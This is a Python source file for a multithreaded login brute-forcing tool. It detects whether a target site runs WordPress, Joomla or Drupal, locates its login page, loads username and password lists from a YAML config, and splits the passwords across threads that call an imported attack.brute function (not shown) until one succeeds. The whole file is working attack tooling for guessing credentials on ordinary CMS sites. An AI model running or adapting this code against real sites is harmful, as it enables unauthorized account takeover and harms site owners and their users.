import argparse
from sqlite3 import Time
import threading
from time import time
import attack
from Wappalyzer import Wappalyzer, WebPage

class LoginBrute:

    def get_admin_page(self, url):
        webpage = WebPage.new_from_url(url)
        wappalyzer = Wappalyzer.latest()
        wappalyzer = wappalyzer.analyze(webpage)
        if 'WordPress' in wappalyzer:
            if 'wp-login.php' not in url:
                url += '/wp-login.php' 
        elif 'Joomla' in wappalyzer:
            if 'index.php?option=com_users&lang=en&view=login' not in url:
                url += '/index.php?option=com_users&lang=en&view=login' 
        elif 'Drupal' in wappalyzer:
            url += 'user/login'
        return url

    def __init__(self, ):
        print("#########################################\n\n")
        params = self.get_parameters(self.get_args())
        pass_list_len = len(params['password_list'])
        passwords = params['password_list']

        if pass_list_len < 5:
            for i in range(len(params['password_list'])):
                threading.Thread(target=attack.brute, args=(params, (passwords[i].strip(), )), daemon=True).start()
        else:
            chunks = [params['password_list'][i:i+int(pass_list_len/5)] for i in range(0, pass_list_len, int(pass_list_len/5))]
            for i in range(5):
                threading.Thread(target=attack.brute, args=(params, chunks[i]), daemon=True).start()
        while not attack.success:
            pass
    
    def get_args(self):
        import yaml

        with open("config.yml", 'r') as ymlfile:
            cfg = yaml.safe_load(ymlfile)
        # list = [{str(j): str(i) for i, j in enumerate(d)} for d in cfg]
        return cfg

    def get_parameters(self, args):
        host = args['post_url']
        user_list = args['user_list']
        pass_list = args['pass_list']
        url = args['url']
        user_param = args['user_param']
        password_param = args['pass_param']
        req_body = args['req_body']
        method = args['method']
        # static_elements = args['static_elements']
        req_header = args['req_header']
        action = args['post_url']

        # list = [{str(j): str(i) for i, j in enumerate(d)} for d in list]
        url = self.get_admin_page(url)
        
        # check if user_list and password_list files are exists
        try:
            pass_list = open(pass_list, encoding="utf-8").readlines()
        except IOError as e:
            print('File ' + pass_list + ' not found')
            
        try:
            user_list = open(user_list, encoding="utf-8").readlines()
        except IOError as e:
            print('File ' + user_list + ' not found')

        if 'http' not in action:
            if action[0] == '/':
                url = url + action[1:len(action)]
            else:
                ind = url.rfind('/')
                url = url[0 : ind+1]
                url = url+ action
        else:
            url = action

        return {
            'user_list': user_list,
            'password_list': pass_list,
            'user_param': user_param,
            'password_param': password_param,
            'method': method,
            'url': url,
            'action': action,
            'req_header': req_header,
            'host': host,
            'req_body':req_body,
            
        }

LoginBrute()
